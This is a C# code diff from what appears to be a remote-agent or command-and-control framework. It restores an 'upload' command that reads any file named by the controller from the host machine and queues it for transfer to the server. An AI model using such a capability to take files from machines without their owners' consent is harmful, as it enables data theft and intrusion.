@@ -12,44 +12,48 @@ namespace Agent.Commands
     {
         public override string Name => "upload";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            throw new NotImplementedException();
-            //if (task.SplittedArgs.Length == 0)
-            //{
-            //    result.Result = "Please specify the name of the file to upload!";
-            //    return;
-            //}
+            if (task.SplittedArgs.Length == 0)
+            {
+                context.Result.Result = "Please specify the name of the file to upload!";
+                return;
+            }
 
-            //var path = task.SplittedArgs[0];
-            //var filename = Path.GetFileName(path);
-           
-            //if(!File.Exists(path))
-            //{
-            //    result.Result = $"File {path} not found.";
-            //    return;
-            //}
+            var path = task.SplittedArgs[0];
+            var filename = Path.GetFileName(path);
 
-            //byte[] fileBytes = null;
-            //using (FileStream fs = File.OpenRead(path))
-            //{
-            //    fileBytes = new byte[fs.Length];
-            //    fs.Read(fileBytes, 0, (int)fs.Length);
-            //}
+            if (!File.Exists(path))
+            {
+                context.Result.Result = $"File {path} not found.";
+                return;
+            }
 
-            //if (task.SplittedArgs.Length > 1)
-            //    filename = task.SplittedArgs[1];
-            //else
-            //    filename = Path.GetFileName(filename);
+            byte[] fileBytes = null;
+            using (FileStream fs = File.OpenRead(path))
+            {
+                fileBytes = new byte[fs.Length];
+                fs.Read(fileBytes, 0, (int)fs.Length);
+            }
 
-            //string fileId = commm.Upload(fileBytes, filename, a =>
-            //{
-            //    result.Info = $"Uploading {filename} ({a}%)";
-            //    commm.SendResult(result);
-            //}).Result;
+            if (task.SplittedArgs.Length > 1)
+                filename = task.SplittedArgs[1];
+            else
+                filename = Path.GetFileName(filename);
 
-            //result.Result = $"File {path} uploaded to the server.";
-            //result.Files.Add(new TaskFileResult() { FileId = fileId, FileName = filename });
+            var fileId = Guid.NewGuid().ToString();
+            context.FileService.AddFileToUpload(fileId, filename, fileBytes);
+
+            this.CheckFileUploaded(fileId, filename, context);
+
+
+            context.Result.Files.Add(new TaskFileResult()
+            {
+                FileId = fileId,
+                FileName = filename,
+            });
+
+
         }
     }
 }
